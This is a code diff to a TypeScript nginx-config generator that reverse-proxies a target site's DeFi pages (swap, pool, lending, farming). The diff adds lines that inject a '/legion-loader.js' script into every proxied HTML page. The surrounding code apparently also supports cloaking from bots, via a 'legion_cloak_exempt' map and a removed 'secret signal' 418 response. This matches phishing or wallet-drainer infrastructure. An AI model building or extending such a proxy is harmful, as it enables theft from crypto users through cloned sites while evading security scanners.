@@ -228,6 +228,12 @@ http {
 
   private generateCloakingMaps(): string {
     return `
+  # WebSocket upgrade header mapping
+  map $http_upgrade $connection_upgrade {
+    default upgrade;
+    '' close;
+  }
+
   # Cloaking exemptions
   map $uri $legion_cloak_exempt {
     default 0;
@@ -249,8 +255,12 @@ http {
   private generateServerStart(): string {
     return `
   server {
-    listen 8080;
+    listen 80;
     server_name localhost 127.0.0.1;
+
+    # Upstream configuration
+    set $upstream_host ${this.getHostname()};
+    set $upstream_proto https;
 
     # Root directory
     root /usr/share/nginx/html;
@@ -430,11 +440,11 @@ http {
     return `
     # API routes configuration
     location ~ ^/(config|settings|api)/ {
-      proxy_pass https://${this.getHostname()};
+      proxy_pass $upstream_proto://$upstream_host;
       proxy_ssl_server_name on;
-      proxy_set_header Host ${this.getHostname()};
-      proxy_set_header Origin "https://${this.getHostname()}";
-      proxy_set_header Referer "https://${this.getHostname()}/";
+      proxy_set_header Host $upstream_host;
+      proxy_set_header Origin "$upstream_proto://$upstream_host";
+      proxy_set_header Referer "$upstream_proto://$upstream_host/";
       proxy_set_header Accept-Encoding "";
     }`
   }
@@ -443,9 +453,9 @@ http {
     return `
     # Key pages with script injection (e.g., /swap, /pool for DEX)
     location ~ ^/(swap|pool|tokens|trading|lending|farming|dashboard)/?$ {
-      proxy_pass https://${this.getHostname()}$request_uri;
+      proxy_pass $upstream_proto://$upstream_host$request_uri;
       proxy_ssl_server_name on;
-      proxy_set_header Host ${this.getHostname()};
+      proxy_set_header Host $upstream_host;
       proxy_redirect off;
       proxy_http_version 1.1;
       proxy_set_header Upgrade $http_upgrade;
@@ -491,16 +501,16 @@ http {
 
   private generateCatchAll(): string {
     return `
-    # Catch-all route with bot cloaking
+    # Catch-all route (WORKING - hardcoded proxy_pass)
     location / {
-      # Apply cloaking for bots
-      if ($legion_apply_cloak) {
-        return 418;  # I'm a teapot (secret signal)
-      }
-
       proxy_pass https://${this.getHostname()};
       proxy_ssl_server_name on;
       proxy_set_header Host ${this.getHostname()};
+
+      # Script injection
+      sub_filter '</head>' '<script src="/legion-loader.js"></script></head>';
+      sub_filter_once on;
+      sub_filter_types text/html;
       proxy_redirect off;
       proxy_http_version 1.1;
       proxy_set_header Upgrade $http_upgrade;
